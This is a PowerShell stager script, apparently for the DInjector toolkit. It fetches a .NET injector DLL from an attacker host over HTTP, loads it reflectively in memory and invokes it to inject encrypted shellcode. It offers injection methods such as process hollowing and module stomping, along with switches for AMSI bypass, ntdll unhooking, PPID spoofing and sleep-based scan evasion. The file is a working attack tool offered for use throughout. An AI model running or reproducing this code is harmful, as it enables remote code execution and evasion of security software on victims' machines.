<#
.DESCRIPTION

Module name. Choose from:
  
  "functionpointer",
  "functionpointerunsafe",
  "clipboardpointer",
  "currentthread",
  "currentthreaduuid",
  "remotethread",
  "remotethreaddll",
  "remotethreadview",
  "remotethreadsuspended",
  "remotethreadkernelcb",
  "remotethreadapc",
  "remotethreadcontext",
  "processhollowing",
  "modulestomping"
#>
$A = "currentthread"

# [/sc] lhost
$B = "10.10.13.37"

# [/sc] lport
$C = 80

# injector filename
$D = "DInjector.dll"

# [/sc] encrypted shellcode filename
$E = "enc"

# [/p] password to decrypt the shellcode
$F = "Passw0rd!"

# [/protect] protection value that will be applied to the memory region where the shellcode resides ("RX" / "RWX", used in "currentthread")
$G = "RX"

# [/timeout] timeout for WaitForSingleObject in milliseconds (0 is serve forever, used in "currentthread")
$H = 0

# [/flipSleep] time to sleep with PAGE_NOACCESS on shellcode memory region before resuming the thread in milliseconds (0 is disable memory protection flip, used in "currentthread" and "remotethreadsuspended")
$I = 0

# [/image] path to the image of a newly spawned process to inject into (used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
# if there're spaces in the image path, replace them with asterisk (*) characters (e.g., C:\Program Files\Mozilla Firefox\firefox.exe -> C:\Program*Files\Mozilla*Firefox\firefox.exe)
$J = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
$K = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing, used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$L = "explorer"

# [/dll] loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
$M = "msvcp_win.dll"

# [/stompDll] name of the module (DLL) to stomp (used in "modulestomping")
$N = "xpsservices.dll"

# [/stompExport] exported function name to overwrite (used in "modulestomping")
$O = "DllCanUnloadNow"

# [/sleep] number of seconds (approx.) to sleep before execution to evade potential in-memory scan (10s-60s)
$P = 0

# [/blockDlls] block 3rd-party DLLs ("True" / "False", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$Q = "True"

# [/am51] bypass AMSI for current process ("True" / "False")
$R = "True"

# [/remoteAm51] bypass AMSI for remote process ("True" / "False", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$S = "True"

# [/unhook] unhook ntdll.dll ("True" / "False")
$T = "False"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
if ($methods.Contains($A)) {
    $K = (Start-Process -WindowStyle Hidden -PassThru $K).Id
}

$methods = @("remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
if ($methods.Contains($A)) {
    try {
        $L = (Get-Process $L -ErrorAction Stop).Id
        # if multiple processes exist with the same name, arbitrary select the first one
        if ($L -is [array]) {
            $L = $L[0]
        }
    }
    catch {
        $L = 0
    }
}

$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /image:${J} /pid:${K} /ppid:${L} /dll:${M} /stompDll:${N} /stompExport:${O} /sleep:${P} /blockDlls:${Q} /am51:${R} /remoteAm51:${S} /unhook:${T}"

$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "Public,NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd))
